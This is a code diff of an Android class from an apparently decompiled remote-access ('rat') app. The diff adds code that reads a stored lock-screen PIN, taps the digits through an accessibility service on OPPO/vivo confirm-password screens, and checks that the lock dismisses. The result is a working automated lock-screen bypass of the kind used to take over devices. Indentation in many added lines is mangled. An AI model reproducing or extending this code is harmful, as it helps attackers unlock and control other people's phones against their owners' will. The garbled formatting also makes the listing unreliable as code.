@@ -7,6 +7,7 @@ import android.view.accessibility.AccessibilityEvent;
 import com.vendor.rat.auto.condition.CombineFilter;
 import com.vendor.rat.auto.condition.StringCondition;
 import com.vendor.rat.auto.entity.UiNode;
+import com.vendor.rat.credential.LockCredentialStore;
 import com.vendor.rat.service.MyAccessibilityService;
 
 import java.util.ArrayList;
@@ -30,10 +31,10 @@ import java.util.concurrent.atomic.AtomicInteger;
  *
  * 方法对齐:
  *   I(str)  → isLockScreen(str)
- *   L()     → createListenWindows()
+ *   L()   → createListenWindows()
  *   O()     → isVivoOrOppo()
  *   P()     → sleepHalf()
- *   H()     → waitForUnlock()
+ *H()     → waitForUnlock()
  *   J()     → clickVivoConfirm()
  *   K(req)  → unlockDevice(req) [反编译失败]
  *   M(node) → pressEnter(node)
@@ -68,52 +69,161 @@ public class ConfirmLockDelegate extends AutoEngine {
     @Override
     public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
         if (isLockScreen(className)) {
-            Log.d(TAG, "已进入锁屏密码验证代理");
+ Log.d(TAG, "已进入锁屏密码验证代理");
             if (!processedActions.contains("inConfirmLock")) {
-                processedActions.add("inConfirmLock");
-                // vendor: l.c(new a(this, 1), this.c) — 异步执行解锁
-                scheduler.execute(new Runnable() {
-                    @Override public void run() { handleConfirmLock(); }
-                });
-            }
+       processedActions.add("inConfirmLock");
+     // vendor: l.c(new a(this, 1), this.c) — 异步执行解锁
+scheduler.execute(new Runnable() {
+     @Override public void run() { handleConfirmLock(); }
+    });
+   }
         }
     }
 
     /**
-     * 解锁逻辑入口
+ * 解锁逻辑入口
      * vendor: a(this, 1) case 1 → 调用 K(unlockVO)
-     * K() 反编译失败 (1468 条指令), 根据上下文重建骨架:
-     * 1. 获取已保存的密码/图案
-     * 2. 检测密码类型 (PIN/密码/图案)
-     * 3. PIN: 逐个点击数字键 → 确认
-     * 4. 密码: 输入到 EditText → 确认
-     * 5. 图案: dispatchGesture
+     * K() 反编译失败 (1468 条指令), 根据上下文重建:
+  * 1. 获取已保存的 PIN
+  * 2. 逐个点击数字键 (content-desc 匹配)
+     * 3. 等待 ConfirmLockPassword 窗口消失
      */
     private void handleConfirmLock() {
-        try {
+   try {
             Log.d(TAG, "开始处理锁屏确认");
-            // 骨架实现: 真机验证需要已保存的密码数据
+
+        // Read stored PIN
+     String pin = LockCredentialStore.getPin();
+       if (pin == null || pin.isEmpty()) {
+    Log.w(TAG, "No stored PIN available, cannot auto-input");
+       processedActions.remove("inConfirmLock");
+           return;
+        }
+
+       // Wait a moment for UI to settle
+            sleep(500);
+
+     // Get current root
+     activateRoot();
+     UiNode root = k();
+     if (root == null) {
+      Log.w(TAG, "No root node available");
+             processedActions.remove("inConfirmLock");
+       return;
+            }
+
+            // Try OPPO PIN input
+            if (tryHandleOppoPin(root, pin)) {
+                Log.d(TAG, "OPPO PIN input completed successfully");
+     } else {
+    Log.w(TAG, "Failed to auto-input PIN");
+            }
+
             processedActions.remove("inConfirmLock");
-        } catch (Exception e) {
-            logError("handleConfirmLock", e);
-            processedActions.remove("inConfirmLock");
+     } catch (Exception e) {
+   logError("handleConfirmLock", e);
+  processedActions.remove("inConfirmLock");
         }
     }
 
+  /**
+     * Auto-input OPPO 6-digit PIN on ConfirmLockPassword screen.
+     * Finds digit buttons by content-desc and clicks them sequentially.
+     *
+     * @return true if all digits were clicked and window dismissed
+     */
+    private boolean tryHandleOppoPin(UiNode root, String pin) {
+     for (int i = 0; i < pin.length(); i++) {
+         char digit = pin.charAt(i);
+            UiNode digitBtn = findDigitButton(root, digit);
+            if (digitBtn == null) {
+         Log.w(TAG, "Cannot find button for digit: " + digit);
+         return false;
+            }
+          digitBtn.click();
+   Log.d(TAG, "Clicked digit " + (i + 1) + "/" + pin.length());
+  sleep(100); // 100ms between digits
+
+            // Refresh root between digits for stability
+    if (i < pin.length() - 1) {
+           activateRoot();
+       UiNode newRoot = k();
+            if (newRoot != null) {
+    root = newRoot;
+           }
+    }
+  }
+
+     // Wait for ConfirmLockPassword to dismiss
+        return waitForConfirmWindowDismissByPolling();
+    }
+
     /**
-     * 判断是否为锁屏验证界面
+* Find a digit button by content-desc on the ConfirmLockPassword screen.
+     * OPPO buttons use content-desc="0" through "9".
+ */
+    private UiNode findDigitButton(UiNode root, char digit) {
+        // Primary: find by content-desc (OPPO confirmed pattern)
+        CombineFilter filter = CombineFilter.and(
+     StringCondition.className("android.widget.Button"),
+      StringCondition.descEquals(String.valueOf(digit)));
+        return root.findOneByCombine(filter);
+    }
+
+    /**
+     * Wait for the ConfirmLockPassword window to dismiss.
+     * Polls up to 5 seconds (25 attempts × 200ms).
+     *
+     * Success: root changes to non-ConfirmLockPassword window
+     * Failure: still on ConfirmLockPassword after timeout
+     */
+    private boolean waitForConfirmWindowDismissByPolling() {
+   for (int i = 0; i < 25; i++) {
+sleep(200);
+
+            // Check if current window is still ConfirmLockPassword
+            MyAccessibilityService svc = MyAccessibilityService.getInstance();
+    if (svc != null) {
+      String currentClass = MyAccessibilityService.getCurrentWindowClass();
+    if (currentClass != null && !isLockScreen(currentClass)) {
+    Log.d(TAG, "ConfirmLockPassword dismissed (now: " + currentClass + ")");
+         return true;
+      }
+    }
+
+  // Fallback: check if root node has changed
+   activateRoot();
+  UiNode root = k();
+  if (root != null) {
+          // Look for the "输入锁屏密码" text — if gone, window dismissed
+   UiNode lockPrompt = root.findOneByCombine(
+    CombineFilter.and(
+  StringCondition.className("android.widget.TextView"),
+               StringCondition.textContains("锁屏密码")));
+            if (lockPrompt == null) {
+ Log.d(TAG, "ConfirmLockPassword UI no longer visible (poll " + (i + 1) + ")");
+             return true;
+  }
+            }
+      }
+        Log.w(TAG, "ConfirmLockPassword dismiss timeout (5s)");
+        return false;
+    }
+
+    /**
+* 判断是否为锁屏验证界面
      * ADAPT: I(str) → isLockScreen
      */
     public static boolean isLockScreen(String className) {
         if (className == null || className.isEmpty()) {
-            // ADAPT: vendor 检查 MyAccessibilityService.f224v.get()
-            return false;
+// ADAPT: vendor 检查 MyAccessibilityService.f224v.get()
+ return false;
         }
         return Objects.equals(className, "com.android.settings.password.ConfirmLockPassword")
-                || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern")
-                || Objects.equals(className, "com.android.settings.password.ChooseLockGeneric")
-                || Objects.equals(className, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
-                || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern$InternalActivity");
+     || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern")
+        || Objects.equals(className, "com.android.settings.password.ChooseLockGeneric")
+            || Objects.equals(className, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
+           || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern$InternalActivity");
         // ADAPT: vendor 还检查 SoftInputWindow + password() 条件，此处省略
     }
 
@@ -122,17 +232,17 @@ public class ConfirmLockDelegate extends AutoEngine {
      * ADAPT: L() → createListenWindows
      */
     public static List<WindowMatcher> createListenWindows() {
-        List<WindowMatcher> list = new ArrayList<>();
+    List<WindowMatcher> list = new ArrayList<>();
         list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPassword")
-                .addEventType(32).addEventType(16384));
-        list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPattern")
-                .addEventType(32).addEventType(16384));
+    .addEventType(32).addEventType(16384));
+     list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPattern")
+    .addEventType(32).addEventType(16384));
         list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ChooseLockGeneric")
-                .addEventType(32).addEventType(16384));
+   .addEventType(32).addEventType(16384));
         list.add(new WindowMatcher(SETTINGS, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
-                .addEventType(32).addEventType(16384));
+         .addEventType(32).addEventType(16384));
         list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPattern$InternalActivity")
-                .addEventType(32).addEventType(16384));
+ .addEventType(32).addEventType(16384));
         return list;
     }
 
@@ -143,53 +253,53 @@ public class ConfirmLockDelegate extends AutoEngine {
      */
     public final boolean waitForUnlock() {
         AtomicInteger counter = new AtomicInteger(0);
-        while (counter.incrementAndGet() < 20 && isLockScreen(null)) {
+  while (counter.incrementAndGet() < 20 && isLockScreen(null)) {
             try {
-                Thread.sleep(100L);
-            } catch (Exception e) {
-                Log.e(TAG, "waitForUnlock interrupted", e);
-            }
+            Thread.sleep(100L);
+   } catch (Exception e) {
+ Log.e(TAG, "waitForUnlock interrupted", e);
+ }
         }
-        return !isLockScreen(null);
+return !isLockScreen(null);
     }
 
     /**
      * 点击 vivo 确认按钮
      * ADAPT: J() → clickVivoConfirm
-     * 尝试多种确认按钮 ID
+  * 尝试多种确认按钮 ID
      */
     public final void clickVivoConfirm() {
         UiNode root = getRootNode();
         if (root == null) return;
 
         String pkg = this.settingsPackage;
-        String[][] buttons = {
+ String[][] buttons = {
             {"android.view.View", pkg + ":id/mix_confirm"},
             {"android.widget.TextView", pkg + ":id/iv_complete"},
-            {"android.widget.Button", pkg + ":id/vivo_pin_confirm"},
-            {"android.widget.TextView", pkg + ":id/mix_normal_confirm"}
+    {"android.widget.Button", pkg + ":id/vivo_pin_confirm"},
+       {"android.widget.TextView", pkg + ":id/mix_normal_confirm"}
         };
 
-        for (String[] btn : buttons) {
-            CombineFilter filter = CombineFilter.and(
+    for (String[] btn : buttons) {
+          CombineFilter filter = CombineFilter.and(
                     StringCondition.className(btn[0]),
-                    StringCondition.viewId(btn[1]));
-            UiNode node = root.findOneByCombine(filter);
-            if (node != null && node.click()) {
-                return;
-            }
+        StringCondition.viewId(btn[1]));
+  UiNode node = root.findOneByCombine(filter);
+    if (node != null && node.click()) {
+           return;
+   }
         }
     }
 
     /**
      * 短暂等待
-     * ADAPT: P() → sleepHalf (500ms)
+   * ADAPT: P() → sleepHalf (500ms)
      */
     public static void sleepHalf() {
         try {
             Thread.sleep(500);
         } catch (Exception e) {
-            Log.e(TAG, "sleepHalf", e);
+  Log.e(TAG, "sleepHalf", e);
         }
     }
 
@@ -199,10 +309,10 @@ public class ConfirmLockDelegate extends AutoEngine {
      * vendor 优先用 ADB "input keyevent 66", fallback 用 uiObject.enter()
      */
     public final void pressEnter(UiNode uiObject) {
-        // vendor M():188 — 先尝试 ADB shell "input keyevent 66" (需要 root/shell 权限)
+// vendor M():188 — 先尝试 ADB shell "input keyevent 66" (需要 root/shell 权限)
         // 当前环境无 ADB shell 集成, 使用 performAction fallback
         if (uiObject != null && Build.VERSION.SDK_INT >= 30) {
-            uiObject.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
+     uiObject.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
         }
     }
 
@@ -211,14 +321,14 @@ public class ConfirmLockDelegate extends AutoEngine {
     @Override
     public boolean equals(Object obj) {
         if (this == obj) return true;
-        if (obj != null && (obj instanceof ConfirmLockDelegate)) {
-            return Objects.equals(this.settingsPackage, ((ConfirmLockDelegate) obj).settingsPackage);
+ if (obj != null && (obj instanceof ConfirmLockDelegate)) {
+       return Objects.equals(this.settingsPackage, ((ConfirmLockDelegate) obj).settingsPackage);
         }
         return false;
     }
 
     @Override
     public int hashCode() {
-        return Objects.hash(ConfirmLockDelegate.class.getName(), this.settingsPackage);
+ return Objects.hash(ConfirmLockDelegate.class.getName(), this.settingsPackage);
     }
 }
